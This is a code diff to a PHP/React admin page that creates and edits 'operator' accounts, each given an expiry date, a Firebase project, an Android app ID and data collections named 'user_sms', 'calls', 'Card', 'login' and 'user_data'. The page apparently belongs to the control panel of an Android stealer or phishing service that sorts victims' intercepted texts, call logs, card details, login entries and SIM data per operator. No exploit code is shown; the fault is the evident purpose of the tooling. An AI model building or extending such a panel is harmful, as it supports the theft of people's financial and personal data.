@@ -18,6 +18,7 @@ include_once __DIR__ . '/header.php';
       const [password, setPassword] = React.useState('');
       const [firebaseProject, setFirebaseProject] = React.useState('adminto-op-custom');
       const [firebaseApiKey, setFirebaseApiKey] = React.useState('');
+      const [firebaseDatabaseUrl, setFirebaseDatabaseUrl] = React.useState('');
       const [firebaseAuthDomain, setFirebaseAuthDomain] = React.useState('');
       const [storageBucket, setStorageBucket] = React.useState('');
       const [appId, setAppId] = React.useState('');
@@ -71,12 +72,18 @@ include_once __DIR__ . '/header.php';
               password: password.trim(),
               firebaseProject: firebaseProject.trim(),
               firebaseApiKey: firebaseApiKey.trim(),
+              firebaseDatabaseUrl: firebaseDatabaseUrl.trim(),
               firebaseAuthDomain: firebaseAuthDomain.trim(),
               storageBucket: storageBucket.trim(),
               appId: appId.trim(),
               expiryDate: expiryDate,
               role: 'operator',
-              orgId: 'org_' + username.trim()
+              orgId: 'org_' + username.trim(),
+              collectionSms: editSmsColl || 'user_sms',
+              collectionCalls: editCallsColl || 'calls',
+              collectionCards: editCardsColl || 'Card',
+              collectionForms: editFormsColl || 'login',
+              collectionSims: editSimsColl || 'user_data'
             })
           });
           const data = await res.json();
@@ -219,7 +226,12 @@ include_once __DIR__ . '/header.php';
               firebaseDatabaseUrl: editDatabaseUrl.trim(),
               firebaseAuthDomain: editAuthDomain.trim(),
               storageBucket: editStorageBucket.trim(),
-              appId: editAppId.trim()
+              appId: editAppId.trim(),
+              collectionSms: editSmsColl.trim(),
+              collectionCalls: editCallsColl.trim(),
+              collectionCards: editCardsColl.trim(),
+              collectionForms: editFormsColl.trim(),
+              collectionSims: editSimsColl.trim()
             })
           });
           const data = await res.json();
@@ -369,6 +381,14 @@ include_once __DIR__ . '/header.php';
                 <div>
                   <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Assigned Firebase Project ID</label>
                   <input type="text" className="search-input" placeholder="adminto-north-region" value={firebaseProject} onChange={(e) => setFirebaseProject(e.target.value)} required />
+                </div>
+                <div style={{ gridColumn: 'span 2' }}>
+                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700, marginBottom: '6px' }}>🔗 Firebase Database URL (`databaseURL`) — REQUIRED for live data</label>
+                  <input type="text" className="search-input" placeholder="https://your-app-default-rtdb.asia-southeast1.firebasedatabase.app" value={firebaseDatabaseUrl} onChange={(e) => setFirebaseDatabaseUrl(e.target.value)} />
+                </div>
+                <div>
+                  <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>App ID (`1:179...`)</label>
+                  <input type="text" className="search-input" placeholder="1:179278690008:android:bed6..." value={appId} onChange={(e) => setAppId(e.target.value)} />
                 </div>
                 <div>
                   <label style={{ display: 'block', fontSize: '0.8rem', color: '#9ca3af', marginBottom: '6px' }}>Firebase API Key (Optional)</label>
